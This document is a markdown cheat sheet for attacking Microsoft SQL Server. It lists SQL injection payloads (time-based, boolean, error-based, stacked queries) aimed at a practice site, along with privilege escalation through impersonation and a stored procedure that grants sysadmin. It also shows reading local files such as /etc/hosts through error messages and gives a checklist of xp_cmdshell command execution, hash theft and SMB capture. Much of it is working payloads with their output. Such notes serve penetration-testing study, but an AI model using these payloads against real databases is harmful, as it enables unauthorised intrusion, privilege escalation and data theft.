# MSSQL - Danger functionalities and misconfigurations

## Techniques
### Time Based
Req
```http
GET /Make/2?orderby=supercarid+WAITFOR+DELAY+'00:00:04'-- HTTP/2
Host: hack-yourself-first.com
```

### Boolean Based
Req
```http
GET /Make/2?orderby=(select+CASE+WHEN+(1=2)+THEN+'supercarid'+ELSE+(SELECT+1+Union+select+2)+END)-- HTTP/2
Host: hack-yourself-first.com
```
Response when false
```
Status code 500
Subquery returned more than 1 value
```

### Error Based
Req
```
GET /Make/2?orderby=(CONVERT(INT%2c@@version))-- HTTP/2
Host: hack-yourself-first.com
```
Response
```
Conversion failed when converting the nvarchar value 'Microsoft SQL Azure (RTM) - 12.0.2000.8 <br>	Nov &nbsp;2 2023 01:40:17 <br>	Copyright (C) 2022 Microsoft Corporation<br>' to data type int.</title>
```

### Stacked queried
Req
```
GET /Make/2?orderby=supercarid;WAITFOR+DELAY+'00:00:04'-- HTTP/2
Host: hack-yourself-first.com
```
## Concepts

### Double and single quotes are treated differently in MSSQL

The reason why ```SELECT DB_NAME('1')``` works and ```SELECT DB_NAME("1")``` does not work is that double quotes are not interpreted the same way as single quotes in SQL Server.

When you use **double quotes**, SQL Server treats them as **delimiters for object identifiers, not as string delimiters**. In the case of the **DB_NAME function, it expects a string as an argument**, and this string should be delimited by single quotes.

Therefore, the DB_NAME function correctly receives the string "1" as an argument. **If you attempt to use double quotes, SQL Server will interpret it as an object identifier**, resulting in an error.

### Structure
* Master – All system objects to run the active relational database management system
* Model – Template database for new user defined databases and Tempdb when SQL Server starts
* TempDB – Stores all temporary objects such as #temp tables, ##temp tables, hash and sort records, etc.
* MSDB – Stores all SQL Server Agent related tables and stored procedures
* ResourceDB – Hidden and read-only database that includes all system objects

https://www.mssqltips.com/sqlservertip/6422/sql-server-concepts/

#### How permissions works
* The primary identity is the login itself. The secondary identity includes permissions inherited from roles and groups.
* Every database user belongs to the public database role. When a user has not been granted or denied specific permissions on a securable, the user inherits the permissions granted to public on that securable. (https://learn.microsoft.com/en-us/previous-versions/sql/sql-server-2008-r2/ms181127(v=sql.105))

#### SQL Link
* A SQL link from one SQL server to another simply enables you to perform queries against it. This is valuable if you need to collect and present data stored in multiple databases spread over multiple SQL servers (https://blog.improsec.com/tech-blog/dangers-mssql-features-impersonation-amp-links).

#### Grant permissions from user A to user B

* The authentication login is the entity that grants access to the server
```
CREATE LOGIN bruno WITH PASSWORD = 'Test@4567';
```
* The database user is the entity used to control access and permissions within a specific database
```
CREATE USER bruno FOR LOGIN bruno;
```

```
ALTER ROLE public ADD MEMBER bruno;
```
```
EXEC sp_addrolemember 'public', 'bruno';
```

* List users that can be impersonated
```
SELECT grantee_principal.name AS WhoCanImpersonate ,grantee_principal.type_desc AS ImpersonatorType ,sp.name AS WhoCanTheyImpersonate ,sp.type_desc AS ImpersonateeLoginType FROM sys.server_permissions AS prmssn INNER JOIN sys.server_principals AS sp ON sp.principal_id = prmssn.major_id AND prmssn.class = 101 INNER JOIN sys.server_principals AS grantee_principal ON grantee_principal.principal_id = prmssn.grantee_principal_id WHERE prmssn.state = 'G'
```

Result:
|WhoCanImpersonate|ImpersonatorType|WhoCanTheyImpersonate|ImpersonateeLoginType|
|-----------------|----------------|---------------------|---------------------|
|bruno            |SQL_LOGIN       |sa                   |SQL_LOGIN            |

### Impersonation - The problem(https://blog.improsec.com/tech-blog/dangers-mssql-features-impersonation-amp-links)
* You might have already guessed it. The problem is that you might not know exactly what permissions you acquire when using impersonation. Building on the example above, exactly which permissions does recipeadmin have? Might it have permissions on other databases, not intended for recipeuser to access? Might it even have administrative permissions on the SQL server itself?
#### Privilege Creep
* This can happen when people change positions internally, and the permissions from the old position aren’t revoked when the change takes effect. Over time, this can accumulate and too many privileges are held. This can be combatted by implementing an Identity Governance model with periodic attestation of permissions.

How is this related to impersonation? Well, what happens when recipeadmin obtains new permissions? Recipeuser inherits them through the impersonation privilege, which isn’t necessarily intended

### Data types
![](https://www.mssqltips.com/tipimages2/6874_cast-sql-function.002.png)
https://www.mssqltips.com/sqlservertip/6874/sql-cast-function-for-data-type-conversions/

### Casting datas
#### CAST
* CAST function that is an ANSI standard and is cross platform compatible
```
select cast(@@version as int)
```
#### CONVERT
* The convert function is specific to Microsoft's T-SQL and will not function properly on other DBMSs, unlike the CAST function that is an ANSI standard and is cross platform compatible
```
select convert(int,@@version)
```
#### PARSE
* This function, like the CAST and CONVERT, return an expression translated to the requested data type. PARSE works fine converting from string to date/time and number types.
```
select PARSE(@@version as int)
```
### Data Output Format
* FOR JSON/XML AUTO
Querie
```
SELECT name FROM master..syslogins FOR JSON AUTO
```
Result
```
[{"name":"sa"},{"name":"##MS_SQLResourceSigningCertificate##"},{"name":"##MS_SQLReplicationSigningCertificate##"},{"name":"##MS_SQLAuthenticatorCertificate##"},{"name":"##MS_PolicySigningCertificate##"},{"name":"##MS_SmoExtendedSigningCertificate##"},{"name":"##MS_PolicyEventProcessingLogin##"},{"name":"##MS_PolicyTsqlExecutionLogin##"},{"name":"##MS_AgentSigningCertificate##"},{"name":"BUILTIN\\Administrators"},{"name":"NT AUTHORITY\\SYSTEM"},{"name":"NT AUTHORITY\\NETWORK SERVICE"}]
```
> Note: "JSON PATH" is frequently referenced, but it is most commonly used when constructing a query and you want to specify how the JSON output will be formatted.

* STRING_AGG(TABLE_NAME,DELIMITER)
Querie
```
SELECT STRING_AGG(name, ',') FROM sys.databases
```
Result
```
master,tempdb,model,msdb
```

### Thoughts and Workflow made by MSDAT, good to do a checklist (msdat: https://github.com/quentinhardy/msdat)
* Can the current user become sysadmin with trustworthy database method?
* You can steal hashed passwords?
* Can we execute system commands with xpcmdshell (directly)?
* Can we re-enable xpcmdshell to use xpcmdshell?
* Can you use SQL Server Agent Stored Procedures (jobs) to execute system commands?
* Can you capture a SMB authentication?
* Can you use OLE Automation to read files?
* Can you use OLE Automation to write files?
* Can you use OLE Automation to execute Windows system commands?
* Can you use Bulk Insert to read files?
* Can you use Openrowset to read files?
* Can you connect to remote databases with openrowset? (useful for dictionary attacks)
* Can you list files with xp_dirtree?
* Can you list directories with xp_subdirs?
* Can you list drives with xp_subdirs?
* Can you list medias with xp_availablemedia?
* Can you check if a file exist thanks to xp_fileexist?
* Can you create a folder with xp_createsubdir?

### Create a stored procedure in current database
```
CREATE PROCEDURE IMDATELOHJOSUUSOOJAHMSAT WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember 'bruno','sysadmin'
```

## Useful Queries
### List all roles
```
Select [name] From sysusers Where issqlrole = 1
```
### Read localfile through errors
```
Select cast((select x from OpenRowset(BULK '/etc/hosts',SINGLE_CLOB) R(x)) as int) 
```
* ```display_errors``` should be enabled on PHP configuration

### Get database physical path
```
SELECT TOP 1 physical_name FROM sys.master_files
```
Response:
```
/var/opt/mssql/data/master.mdf
```

### Get current querie
```
select text from sys.dm_exec_requests cross apply sys.dm_exec_sql_text(sql_handle)
```

**CAUTION**
The following query should be executed with caution as it has the potential to impact the performance of MSSQL, depending on the size of the table entries returned. It is recommended to run it only when there is confidence that the returned row isn't excessively long.

### DUMP all in one shot using XML
Request (for JSON auto could be also used)
```
(select * from master..sysdatabases) for xml PATH('')
```
Response
```
<name>master</name><dbid>1</dbid><sid>AQ==</sid><mode>0</mode><status>65544</status><status2>
```

## Resources
* https://www.sqlservertutorial.net/
* https://github.com/ktaranov/sqlserver-kit
* https://github.com/quentinhardy/msdat
* https://blog.improsec.com/tech-blog/dangers-mssql-features-impersonation-amp-links
* https://web.archive.org/web/20220331031141/https://www.allenkinsel.com/archive/2013/12/finding-impersonation-info-in-sql-server/
* https://blog.improsec.com/tech-blog/dangers-mssql-features-impersonation-amp-links
* https://www.madeiradata.com/post/how-to-protect-sql-server-from-hackers-and-penetration-tests

## Local Lab
Docker instance
```
docker run -e "ACCEPT_EULA=Y" -e 'MSSQL_SA_PASSWORD=yourStrong(!)Password' -p 1433:1433 -d mcr.microsoft.com/mssql/server:2019-latest
```
